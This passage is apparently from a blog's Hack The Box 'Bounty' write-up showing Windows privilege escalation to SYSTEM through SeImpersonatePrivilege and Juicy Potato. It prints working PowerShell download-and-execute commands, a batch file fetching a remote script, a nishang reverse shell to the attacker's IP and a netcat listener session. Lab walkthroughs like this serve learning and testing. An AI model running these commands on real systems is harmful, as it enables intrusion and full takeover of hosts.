SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</span></pre></table></code></div></div><p>As we can see, <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privilege is enabled. We can likely to introduce <code class="language-plaintext highlighter-rouge">Juicy Potato</code> attack in order to escalate our privilege to SYSTEM.</p><blockquote><p><strong>NOTE</strong>: In Windows, service accounts that are running SQL server or IIS service have this privilege enabled by design. This privilege can abuse COM servers to impersonate other users. In short, if the has <code class="language-plaintext highlighter-rouge">SeImpersonate</code> or <code class="language-plaintext highlighter-rouge">SeAssignPrimaryToken</code> privileges then you are SYSTEM.</p></blockquote><h4 id="juicy-potato-attack">Juicy Potato Attack</h4><p>Download the compiled binary for the <code class="language-plaintext highlighter-rouge">Juicy Potato</code> <a href="https://github.com/ohpe/juicy-potato/releases">here</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/htb/bounty/12.png" alt="image" /></p><p>First, tranfer the <code class="language-plaintext highlighter-rouge">JuicyPotato.exe</code> binary to the Bounty box.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">PS C:\users\merlin\Desktop&gt;</span><span class="w"> </span>powershell.exe <span class="nt">-c</span> IEX<span class="o">(</span>new-object net.webclient<span class="o">)</span>.downloadfile<span class="o">(</span><span class="s1">'http://10.10.14.25/JuicyPotato.exe'</span>, <span class="s1">'C:\Users\merlin\Desktop\juicy.exe'</span><span class="o">)</span>
<span class="go">
</span><span class="gp">PS C:\users\merlin\Desktop&gt;</span><span class="w"> </span><span class="nb">dir</span>
<span class="go">

    Directory: C:\users\merlin\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        11/16/2020   6:01 AM     347648 juicy.exe 
</span></pre></table></code></div></div><p>Next, we need to create a <code class="language-plaintext highlighter-rouge">.bat</code> file which will be executed by the <code class="language-plaintext highlighter-rouge">JuicyPotato.exe</code> binary. We can add the following PowerShell one-liner to call another reverse shell with elevated privilege into the <code class="language-plaintext highlighter-rouge">.bat</code> file.</p><p><code class="language-plaintext highlighter-rouge">exploit.bat</code></p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.25/revShell-juicy.ps1')
</span></pre></table></code></div></div><p>Copy the <code class="language-plaintext highlighter-rouge">revShell.ps1</code> to <code class="language-plaintext highlighter-rouge">revShell-juicy.ps1</code> and change the bottem commad as follow:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-PowerShellTcp</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="nx">10.10.14.25</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">6666</span><span class="w">
</span></pre></table></code></div></div><p>Tranfer the <code class="language-plaintext highlighter-rouge">exploit.bat</code> binary to the Bounty box.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">PS C:\users\merlin\Desktop&gt;</span><span class="w"> </span>powershell.exe <span class="nt">-c</span> IEX<span class="o">(</span>new-object net.webclient<span class="o">)</span>.downloadfile<span class="o">(</span><span class="s1">'http://10.10.14.25/exploit.bat'</span>, <span class="s1">'C:\Users\merlin\Desktop\exploit.bat'</span><span class="o">)</span>
<span class="go">
</span><span class="gp">PS C:\users\merlin\Desktop&gt;</span><span class="w"> </span><span class="nb">dir</span>
<span class="go">

    Directory: C:\users\merlin\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        11/16/2020   6:20 AM         99 exploit.bat                       
-a---        11/16/2020   6:01 AM     347648 juicy.exe
</span></pre></table></code></div></div><p>Finally, run the following command to gain the SYSTEM shell.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">PS C:\users\merlin\desktop&gt;</span><span class="w"> </span>./juicy.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> exploit.bat <span class="nt">-l</span> 4444
<span class="go">Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
</span><span class="c">....
</span><span class="go">[+] authresult 0
</span><span class="gp">{4991d34b-80a1-4291-83b6-3328366b9097};</span>NT AUTHORITY<span class="se">\S</span>YSTEM
<span class="go">
[+] CreateProcessWithTokenW OK
</span></pre></table></code></div></div><p>Once it ran successfully, we will see that the <code class="language-plaintext highlighter-rouge">revShell-juicy.ps1</code> will be called from our web server.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
<span class="go">10.10.10.93 - - [15/Nov/2020 23:29:57] "GET /revShell-juicy.ps1 HTTP/1.1" 200 -
</span></pre></table></code></div></div><p><b>root.txt</b></p><p>And in our <code class="language-plaintext highlighter-rouge">nc</code> listner, SYSTEM shell will appear, and we can read the <code class="language-plaintext highlighter-rouge">root.txt</code> flag :)</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 6666
<span class="go">Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 10.10.10.93.
Ncat: Connection from 10.10.10.93:49198.
</span><span class="gp">Windows PowerShell running as user BOUNTY$</span><span class="w"> </span>on BOUNTY
<span class="go">Copyright (C) 2015 Microsoft Corporation. All rights reserved.

</span><span class="gp">PS C:\Windows\system32&gt;</span><span class="nb">whoami</span>
<span class="go">nt authority\system
</span><span class="gp">PS C:\Windows\system32&gt;</span><span class="w"> </span><span class="nb">cd </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
<span class="gp">PS C:\users\administrator\desktop&gt;</span><span class="w"> </span><span class="nb">dir</span>
<span class="go">

    Directory: C:\users\administrator\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         5/31/2018  12:18 AM         32 root.txt                          


</span><span class="gp">PS C:\users\administrator\desktop&gt;</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">c837***REDACTED***f5ea
</span></pre></table></code></div></div><p>Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/windows/'>Windows</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/bounty/" class="post-tag no-text-decoration" >bounty</a> <a href="/tags/web.config-rce/" class="post-tag no-text-decoration" >web.config rce</a> <a href="/tags/nishang/" class="post-tag no-text-decoration" >nishang</a> <a href="/tags/juicy-potato/" class="post-tag no-text-decoration" >juicy potato</a> <a href="/tags/seimpersonateprivilege/" class="post-tag no-text-decoration" >SeImpersonatePrivilege</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://bigb0sss.github.io/posts/htb-bounty-writeup/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <a href="https://twitter.com/intent/tweet?text=HTB - Bounty Write-up - bigb0ss&url=https://bigb0sss.github.io/posts/htb-bounty-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Bounty Write-up - bigb0ss&u=https://bigb0sss.github.io/posts/htb-bounty-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Bounty Write-up - bigb0ss&url=https://bigb0sss.github.io/posts/htb-bounty-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/redteam-rotate-ip-aws-gateway/">Rotating Source IPs (Part 1) - AWS API Gateway</a><li><a href="/posts/htb-servmon-writeup/">HTB - ServMon Write-up</a></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-buff-writeup/"><div class="card-body"> <span class="timeago small" > Nov 20 <i class="unloaded">2020-11-20T10:25:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Buff Write-up</h3><div class="text-muted small"><p> This one was an easy difficulty box. Good learning path for: Gym Management System 1.0 RCE plink.exe to Port Forward to Bypass Restrictions cloudMe.exe BoF Exploit Initial Recon Nmap Let...</p></div></div></a></div><div class="card"> <a href="/posts/htb-servmon-writeup/"><div class="card-body"> <span class="timeago small" > Nov 25 <i class="unloaded">2020-11-25T05:39:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - ServMon Write-up</h3><div class="text-muted small"><p> This one was an easy-difficulty Windows box. Good learning path for: Anonymous FTP Access and Enumeration NVMS-1000 Directory Traversal Attack SMB Password Guessing (smbclient.py) NSClient...</p></div></div></a></div><div class="card"> <a href="/posts/htb-remote-writeup/"><div class="card-body"> <span class="timeago small" > Dec 3 <i class="unloaded">2020-12-03T07:39:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Remote Write-up</h3><div class="text-muted small"><p> This one was an easy-difficulty Windows box. Good learning path for: Initial Recon Nmap Let’s begin with an initial port scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 2...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-valentine-writeup/" class="btn btn-outline-primary"><p>HTB - Valentine Write-up</p></a> <a href="/posts/htb-frolic-writeup/" class="btn btn-outline-primary"><p>HTB - Valentine Write-up</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//bigb0ss-blog.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://bigb0sss.github.io/posts/htb-bounty-writeup/'; this.page.identifier = '/posts/htb-bounty-writeup/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://www.linkedin.com/in/danielsmin">bigb0ss</a>. <span data-toggle="tooltip" data-placement="top" title="CC BY 4.0 ">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/x86/">x86</a> <a class="post-tag" href="/tags/slae32/">slae32</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/zip2john/">zip2john</a> <a class="post-tag" href="/tags/web.config-rce/">web.config rce</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/valentine/">valentine</a> <a class="post-tag" href="/tags/tomcat/">tomcat</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://bigb0sss.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">[-] No result found</p>' }); </script>
